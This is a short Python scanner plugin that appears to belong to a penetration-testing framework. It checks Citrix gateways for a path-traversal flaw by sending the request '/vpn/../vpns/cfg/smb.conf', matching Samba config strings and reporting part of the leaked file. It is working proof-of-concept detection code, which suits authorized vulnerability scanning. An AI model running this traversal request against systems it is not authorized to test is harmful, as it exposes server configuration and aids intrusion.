#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from lib.poc.dummy import *


@http_scan
async def do_scan(ip, port, service, is_http, task_msg):

    target = '{}://{}:{}/vpn/../vpns/cfg/smb.conf'.format(service, ip, port)
    try:
        r = await http_client(ip, port).get(target, timeout=10)

        if "[global]" in r.text and "encrypt passwords" in r.text and "name resolve order" in r.text:
            ret = {
                'alert_group': 'Citrix RCE',
                'affects': '{}:{}'.format(ip, port),
                'details': 'Citrix存在命令执行漏洞，通过下面的请求可获取系统密码等信息\n'
                           'GET: {} \nreturn: {}'.format(target, r.text[:200])
            }
            return ret
    except Exception as e:
        debug(e)


if __name__ == '__main__':
    scan = do_scan('easypen-test.lijiejie.com', 443, 'https', True, task_msg={})
    run_plugin_test(scan)
